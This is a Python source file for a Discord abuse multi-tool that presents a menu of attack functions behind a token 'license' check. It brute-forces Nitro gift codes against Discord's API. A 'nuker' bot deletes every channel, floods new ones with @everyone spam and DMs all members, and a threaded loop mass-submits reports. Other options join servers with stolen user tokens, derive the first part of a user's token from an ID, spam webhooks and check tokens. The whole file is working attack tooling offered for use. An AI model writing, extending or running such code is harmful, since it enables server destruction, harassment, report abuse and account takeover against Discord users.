import base64
import ctypes
import json
import msvcrt
import random
import sys
from colorama import Fore, Style
import os
import discord
import requests
import time
from requests import Session
from threading import Thread
from time import strftime, gmtime
import getpass

from discord.ext import commands

__developers__ = "xは#0001"
__website__ = "https://discord.gg/xbash"

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

ctypes.windll.kernel32.SetConsoleTitleW(f"xは#0001")

upper_letter = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
lower_letter = 'abcdefghijklmnopqrstuvwxyz'
digits = '0123456789'

v = ["freeforall"]


def get_masked_input(prompt):
    sys.stdout.write(prompt)
    sys.stdout.flush()
    chars = []
    while True:
        char = msvcrt.getch()
        if char == b'\r' or char == b'\n':
            break
        elif char == b'\x08':
            if chars:
                del chars[-1]
                sys.stdout.write('\b \b')
                sys.stdout.flush()
        else:
            chars.append(char)
            sys.stdout.write('*')
            sys.stdout.flush()
    sys.stdout.write('\n')
    return b''.join(chars).decode()
if "xは#0001"in __developers__:
    pass
else:
    print('Stop trying to skid lmao \n')
    input("")
    exit()

if "https://discord.gg/xbash"in __website__:
    pass
else:
    print('Stop trying to skid lmao \n')
    input("")
    exit()

licenseKey = get_masked_input(Fore.LIGHTBLUE_EX + "> root@v?-license~: ")


if licenseKey == v[0]:
    print()
    time.sleep(1)
    print(Fore.GREEN + "[+] V3 License activated ")
    time.sleep(2)
    print()
    clear()
    while True:
        print(Fore.LIGHTBLUE_EX + """                                                                                                        Trial : ∞ - v3                                                              
                                       ▄▀▀▄  ▄▀▄  ▄▀▀█▄▄   ▄▀▀█▄   ▄▀▀▀▀▄  ▄▀▀▄ ▄▄     
                                      █    █   █ ▐ ▄▀   █ ▐ ▄▀ ▀▄ █ █   ▐ █  █   ▄▀ 
                                      ▐     ▀▄▀    █▄▄▄▀    █▄▄▄█    ▀▄   ▐  █▄▄▄█  
                                           ▄▀ █    █   █   ▄▀   █ ▀▄   █     █   █  
                                          █  ▄▀   ▄▀▄▄▄▀  █   ▄▀   █▀▀▀     ▄▀  ▄▀  
                                        ▄▀  ▄▀   █    ▐   ▐   ▐    ▐       █   █    
                                       █    ▐    ▐                         ▐   ▐   

                                                 < developer - xは#0001 >                                      """)
        print()
        print(Fore.LIGHTBLACK_EX + "                    ==============================================================================                    ")
        print()
        print(f"                                [1] Nitro Gen + Checker            [5] Id to Token")
        print(f"                                [2] Discord Nuker                  [6] Webhook Spammer ")
        print(f"                                [3] Mass Report                    [7] Token Checker ")
        print(f"                                [4] Server Joiner                  [8] Mass DM ")
        print()
        print(f"                                [9] EXIT                           v3.2.9")
        print()
        print(Fore.LIGHTBLACK_EX + "                    ==============================================================================                    ")
        print()
        print()

        choice = int(input(Fore.BLUE + "> root@v3-xbash~: "))
        if choice < 1 or choice > 9:
            print(Fore.RED + "Invalid choice. Please select a valid option.\n")
            time.sleep(1)
            continue
        if choice == 1:
            upper_letter = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
            lower_letter = 'abcdefghijklmnopqrstuvwxyz'
            digits = '0123456789'

            print()
            numbtogen = int(input(Fore.LIGHTBLUE_EX + 'How many codes? > '))
            check = input(Fore.LIGHTBLUE_EX + 'Wanna check the codes? (y/n) > ')
            print()

            upper, lower, nums = True, True, True
            all = ""

            if upper:
                all += upper_letter
            if lower:
                all += lower_letter
            if nums:
                all += digits

            length = 16
            amount = numbtogen
            valid_codes = []
            counter = 0
            
            if check == 'y' :
                for x in range(int(numbtogen)):
                    nitro = ''.join(random.sample(all, length))
                    url = f"https://discord.com/api/v8/entitlements/gift-codes/{nitro}?with_application=false&with_subscription_plan=true"
                    response = requests.get(url)
                    if response.status_code == 200:
                        print(Fore.GREEN + '[Valid -> ] ' + Fore.LIGHTBLUE_EX + 'https://discord.gift/' + nitro)
                        valid_codes.append(nitro)
                    else:
                        print(Fore.WHITE + '[Invalid -> ] ' + Fore.LIGHTBLUE_EX + 'https://discord.gift/' + nitro)
            
            if check == 'n' :
                for x in range(int(numbtogen)):
                    nitro = ''.join(random.sample(all, length))
                    print(Fore.WHITE + '[Invalid -> ] ' + Fore.LIGHTBLUE_EX + 'https://discord.gift/' + nitro)
            input(Fore.RED + 'Press any key to restart the menu...')
            clear()
            pass

        elif choice == 2:
            import asyncio
            from colorama import Fore
            import discord
            from discord.ext import commands

            intents = discord.Intents.all()
            intents.members = True
            client = commands.Bot(command_prefix='.', intents=intents)

            print()
            inputt = input(Fore.LIGHTBLUE_EX + "Discord Bot token > ")
            print()
            inputtt = input(Fore.LIGHTBLUE_EX + "message that sends in the channel > ")
            print()
            inputttt = input(Fore.LIGHTBLUE_EX + "message that sends everyone in the server privat > ")
            print()

            @client.event
            async def on_ready():
                print(f'Logged in as {client.user} (ID: {client.user.id}) | Start nuke with .nuke')
                print()
                print("To shut down just close the cmd ...")

            @client.command()
            async def nuke(ctx):
                # Lösche alle Kanäle und Kategorien
                for category in ctx.guild.categories:
                    await category.delete()
                for channel in ctx.guild.channels:
                    await channel.delete()


                # Erstelle 10 Sprachkanäle
                for i in range(55): # change the number for how many channels
                            text = await ctx.guild.create_text_channel(f'🚀🚀') # change name for channel
                            channel = client.get_channel(text.id)
                            await channel.send(f"@everyone {inputtt}") # change channel text

                # all members get a dm
                await asyncio.sleep(1)
                for guild in client.guilds:
                    for member in guild.members:
                        try:
                            await member.send(f"{member.mention} {inputttt}") # Change dm text
                        except:
                            print(f"Error while sending a dm to {member.name}.")




            try:
                client.run(inputt)
            except discord.errors.LoginFailure:
                print(Fore.RED + "Token is invalid")
                print()
                print("Press any key to restart the menu...")
                clear()
                pass

        elif choice == 3:
            sent = 0
            session = Session()
            b = Style.BRIGHT

            print()
            token = input(Fore.LIGHTBLUE_EX + f"Token > ")
            headers = {'Authorization': token, 'Content-Type':  'application/json'}  
            r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
            if r.status_code == 200:
                    pass
            else:
                    print(f"{Fore.RED} > Invalid Token")
                    input()
            guild_id1 = input(Fore.LIGHTBLUE_EX + f"> Server ID > ")
            channel_id1 = input(Fore.LIGHTBLUE_EX + f"> Channel ID > ")
            message_id1 = input(Fore.LIGHTBLUE_EX + f"> Message ID > ")
            reason1 = input(Fore.LIGHTBLUE_EX + f" > Option > ")
            



            def Main():
                global sent
                headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36',
                        'Authorization': token,
                        'Content-Type': 'application/json'
                    }

                payload = {
                    'channel_id': channel_id1,
                    'guild_id': guild_id1,
                    'message_id': message_id1,
                    'reason': reason1
                }

                while True:
                    r = requests.post('https://discord.com/api/v6/report', headers=headers, json=payload)
                    if r.status_code == 201:
                        print(f"{Fore.GREEN} > Sent Report {b+Fore.BLUE}::{Fore.GREEN} ID {message_id1}")
                        ctypes.windll.kernel32.SetConsoleTitleW(f"XBASH | Sent: %s" % sent)
                        sent += 1
      
                    elif r.status_code == 401:
                        print(f"{Fore.RED} > Invalid token")
                        input(Fore.LIGHTMAGENTA_EX + "Press any key to restart the menu...")
                        clear()
                        pass
                    else:
                        print(f"{Fore.RED} > Error")
                        input(Fore.LIGHTMAGENTA_EX + "Press any key to restart the menu...")
                        clear()
                        pass


                    print()
                    for i in range(500, 1000):
                        Thread(target=Main).start()
                        input(Fore.LIGHTMAGENTA_EX + "Press any key to restart the menu...")
                        clear()
                        pass
        elif choice == 4:

            tokenn = input(Fore.LIGHTBLUE_EX + "Discord Token > ")

            # Server-Link von der Eingabeaufforderung einlesen
            server_link = input(Fore.LIGHTBLUE_EX + "Invite Link > ")

            # Eine Verbindung zum Discord-Client herstellen
            client = discord.Client()

            # Ein Event hinzufügen, das ausgelöst wird, wenn der Bot verbunden ist
            @client.event
            async def on_ready():
                print("Logged in successfully.")
    # Beitreten des Servers
                try:
                    await client.accept_invite(server_link)
                    print("Joined the server.")
                except:
                    print("Error while joining the server.")

# Mit dem Discord-Server verbinden und den Bot laufen lassen
            try:
                client.run(tokenn)
            except discord.errors.LoginFailure:
                print(Fore.RED + "Token is invalid")
                print()
                print("Press any key to restart the menu...")
                clear()
                pass
        elif choice == 5:
            try:
                from colorama import Fore, init
            except:
                os.system("py -m pip install colorama")
                from colorama import Fore, init
            init()

            userid = input(Fore.LIGHTBLUE_EX + "Discord ID > ")
            encodedBytes = base64.b64encode(userid.encode("utf-8"))
            encodedStr = str(encodedBytes, "utf-8")
            print(Fore.LIGHTBLUE_EX + f'\n TOKEN FIRST PART : {encodedStr}')
            print()
            input(Fore.RED + "Press any key to restart the menu...")
            clear()
            pass
        elif choice == 6:
            print()
            webhook_url = input(Fore.LIGHTBLUE_EX + "Webhook-URL > ")

            # Einlesen der Nachricht über die Kommandozeile
            print()
            message = input(Fore.LIGHTBLUE_EX + "Message > ")

            print()
            amountt = int(input(Fore.LIGHTBLUE_EX + "amount >"))

            # Senden der Nachricht zehnmal an den Webhook
            for i in range(amountt):
                payload = {"content": message}
                response = requests.post(webhook_url, json=payload)
                if response.status_code == 204:
                    print()
                    print(Fore.GREEN + f"Webhook Successfully sended! : {i+1} ")
            else:
                print(Fore.RED + f"Something got wrong while sending the Webhook 1. Error Code: {response.status_code}")
                print()
                input(Fore.LIGHTMAGENTA_EX + "Press any key to restart the menu...")
                clear()
                pass
        elif choice == 7:
            print()
            token = input(Fore.LIGHTBLUE_EX + "Token you wanna check > ")

            headers = {
                "Authorization": token
            }

            response = requests.get("https://discord.com/api/v9/users/@me", headers=headers)

            if response.status_code == 200:
                user = json.loads(response.text)
                print()
                print(Fore.GREEN + f"The token is valid! Discord Username : {user['username']}#{user['discriminator']}.")
                print()
                input(Fore.LIGHTMAGENTA_EX + "Press any key to restart the menu...")
                clear()
                pass
            else:
                print()
                print(Fore.RED + "The token is not valid.")
                print()
                input(Fore.LIGHTMAGENTA_EX + "Press any key to restart the menu...")
                clear()
                pass
        elif choice == 9:
            print()
            print(Fore.RED + "Exiting...")
            time.sleep(1)
            break
else:
    print()
    time.sleep(2)
    print(Fore.RED + "[+] Invalid License Key")
    print()
    print(Fore.RED + "Press enter to retry...")
    input()


